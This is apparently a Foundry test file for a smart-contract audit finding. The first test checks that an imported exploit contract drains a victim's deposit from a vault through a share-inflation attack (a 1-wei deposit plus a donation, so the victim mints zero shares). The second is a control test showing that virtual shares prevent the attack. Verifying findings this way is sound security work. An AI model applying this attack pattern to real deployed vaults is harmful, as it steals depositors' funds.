// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Collateral, Pocket, Alice} from
    "./40210-depositing-to-pocket-is-vulnerable-to-inflation-attacks-cant.sol";

contract Finding40210Test is Test {
    function test_exploit_alice_receives_zero_shares() public {
        Exploit e = new Exploit();
        uint256 bobBefore = e.token().balanceOf(address(e));
        e.run();

        assertEq(bobBefore, 1e18 + 1, "bob starts with 1 wei plus the donation");
        assertEq(e.aliceShares(), 0, "alice minted 0");
        assertEq(e.token().balanceOf(address(e.alice())), 0, "alice lost 1e18");
        assertEq(e.bobOut(), 2e18 + 1, "bob withdrew alice plus the donation");
        assertEq(e.token().balanceOf(address(e)) - bobBefore, 1e18, "bob profit is alice's deposit");
    }

    function test_control_virtual_shares_leave_alice_a_balance() public {
        Collateral token = new Collateral();
        Pocket pocket = new Pocket(token, true);
        Alice alice = new Alice();
        token.mint(address(this), 1e18 + 1);
        token.mint(address(alice), 1e18);
        token.approve(address(pocket), type(uint256).max);
        uint256 bobShares = pocket.deposit(1);
        token.transfer(address(pocket), 1e18);
        uint256 aliceShares = alice.deposit(pocket, token, 1e18);
        uint256 bobOut = pocket.withdraw(bobShares);

        assertGt(aliceShares, 0, "alice received shares");
        assertLt(bobOut, 1.5e18, "bob cannot take alice's deposit");
        assertGt(token.balanceOf(address(pocket)), 0.5e18, "alice's claim remains in the pocket");
    }
}
